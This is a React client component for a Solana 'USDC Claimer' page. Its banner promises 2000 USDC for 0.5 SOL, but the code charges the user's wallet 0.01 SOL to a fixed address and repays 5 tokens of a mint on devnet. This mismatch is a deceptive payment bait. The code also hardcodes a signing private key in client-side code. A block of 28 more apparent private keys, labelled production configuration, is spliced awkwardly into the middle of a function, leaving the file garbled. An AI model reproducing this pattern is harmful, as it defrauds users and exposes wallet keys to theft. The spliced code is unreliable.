/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "64UCPsNvmhRUJr6UcTSQyk2zHvkerV6PqM1PnfpfBZbtaKkTMWB58LpuHYNB41KZxFc3Pysame27MhRgt9RvS9Vc"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2GK6Pad2vvmsh32LuuAi9Rfq417E4Mf925zGpo57dGiyzPTDjHVqzLheVn8RUhUeBJ9TaiCuiD899WkVfxxY94sY",
  "key1": "5uavsasZgpoQ9LRQaw5E3ggfUX6Cyf4nSVNzMxFQFtHz1TtUtzy7tHfKP7cCjhHFxeLtzaH9362VQT7CzpZoQTeX",
  "key2": "3Q4ZmyUBHeLu6Wa4GX6L9Un3fqTRpjh7xvta2fcRLYj3xvh8KHZSm34zPYzK2rqa6ChJMqw9wq3zg52n7MFgYGdK",
  "key3": "2jcPRPYkAxdkXLq6HmoZJG2xgJyQjQYjooHF5bd7hYW7hYBmnBjuDwVE1eDddJDjHaVhU22cnw1iEzqzSKSHkz8G",
  "key4": "3E3tcqkbeGf2JCabfM1ptgxrXh8eSy6jbTCLww68frDoWB7CxrvQ2qJ3cra9z3hHpuRmqrKDj67psbqANrLY6je3",
  "key5": "4LL8vmJcafRTB387M3sg5qCH1FPsGGuUPetQ7C9jxj9y8h2UfRFRepMTQDEvyk7xeMRTrLttXjahu29mye6HctBd",
  "key6": "3JKjxM43A5oPFUHXW217jWJQuakVcZWwQpCCaAezKV1eoxhXLwiLRgjqbuPjJS8QQeRa3Ae8y2Ug6Gsp3qVDgob",
  "key7": "2da7H4rekEFo3TYNuC8WofKjBHCv3eRHYvfwywRzr5R4XhJK2T7A2jjyXuR5ic7T98FHjHCgNgoVLa22NXPMdjn",
  "key8": "38farNyjdnsHy3wpa3QtNtHK9NF5uDKapc6FbZer7UHRpqi6oqn38YPkWGy9hNaVF7YbuonMCN14m7gbVcgtN9yj",
  "key9": "24cMrqiwK6G8VtGvDwcdyPn1uUJKD1S8bU39Mie97DePiAAgoAQtGRPxq489JuUDujrx4QujaA3zWazy9ae29qPJ",
  "key10": "3cefyTY8A6WVxaESyLunjMZrWK997wVNyQauw64JLhMaQVxPczRkpXDi65oQGcxdD9ShsfwiLbLejWdAcwnxr8Xe",
  "key11": "4hG5EoLg16pbnpY4HF74mEtctvQEh7Lm71aS2D5ufUzRGkDRKYuf2RSwie4STgsZ2yAjMPdjjyXted3f7rfLXGJd",
  "key12": "4B6D5WmeH8uNAA78BgwJd3eisfLHVmLb7AeGRUs7UHTbyQhx6MCV5MmS5yPG5sjcoujeLUXgjNFci2jUuKcyn4YS",
  "key13": "5Jq81hzYKzeEcQDN9qGcFW2KudBc64WWQNPkGZXdy1bb5hUnfC9g9y9ddsixVBpNymbzqKXbkdVBDknYy13XmDJp",
  "key14": "5NJ3QtEKb9kqfVueHe5J8YJwPwTmrHQTFV9mG6qpXoJdnu1xKJJv3B7gJJTHdn6vEvL835DaAn3ghLnZNPvo4T9m",
  "key15": "2GKeq1FZVJoPhk7LcqHjEJGELBxiJSwMMaDeKvvuoyBqGmu8tjeiHxyoAkx8o9GGfpUFidmTLfrtj4fcT8n9KToZ",
  "key16": "2X3uGXfw54VCGT3XJKWDedBPBKJsttgpEywKAhxWbLDdRy3cs8mKeiKbfCJgErULhCjwj1Fwojkhviizp9jNZ7a2",
  "key17": "5yTNWwgcNFu2omwrXh9F24qQPqnwyVoDNkycQuoxWYAXYG13fgtSpE6urxKqa1nmyQeoAGVmuAXwxmwYsiMnncYh",
  "key18": "559sQnsV2BXWEdeVrDf4R6wZqSt5spBKhhYvTVAZ9TapnAzZiKkbkf3pCHmF4WsLRTLRnw5CGA8oQUUPzrSKKki1",
  "key19": "4LouSYXxUkNBVCYTxUkD1XTz1csWdSUGP8N71EhN7ebxUPTzypemM5cjtS9dzr9AMaBppsBGtvtRPdrb3kYecwtr",
  "key20": "pWtvYPTyfVzoiEmcdyktEGCx4HyMftTiMBePnCuAtzSnm4gRdogYiZbvcmrpyic9RxtCmNhaMjBtbJagHCv6SEm",
  "key21": "2XkAENi46RWJK7P25SxSt5k4WKmrauBFttdBre76i83esLfQot2oVd2MLmHAzTuiRvku63A4GHVtz7Yx9zfFX1Bj",
  "key22": "4k8mVNYnzeELh3y3HrQsD2QiWTpdMXcS7hzn8VrSb3ghBDsmDvipBkaxZDa7UgYkM7eVRHqBRjtyWxrhEregrqEN",
  "key23": "3No6c6nd4v9Z3yBjwKYNMiDykpkkA8UvUVG6ET76W1RHwKyhjDvCzwoJdm2SC9PtxvhN62amkwfDBmQtpxdrcdrz",
  "key24": "4b3e49zM4Xbhj4cLyenXr6Zno69viFgoUTktaGcq3LcDoTfDLpYyCyh7UBiRz2ySpNUy3WWYUdpe1Rz7pqunmv4N",
  "key25": "5sEzamsLsjJP1ETBkK4WWW5FX3poZQ22xfd2kxHYvJnsMWu2wygFd8tpDxUnhPxn9ospHvuvAdhs3MAJs8KkrMka",
  "key26": "4iwToXWhZzteEB6gkD4JyBsks9YXC6mWhxrak571YULUaqua1gs6YyCjAZyhe7Mxjdt6iJhkjcC5hjdVKNMRhQNK",
  "key27": "PQ8jFdoUPCN3wESb1qrDYokwXnQsoUwdLSYkz7FgVt6omLDSoVJsm8r28Whd2UrVTgiiMWxdHh2V8X78Jbg1Tjs"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
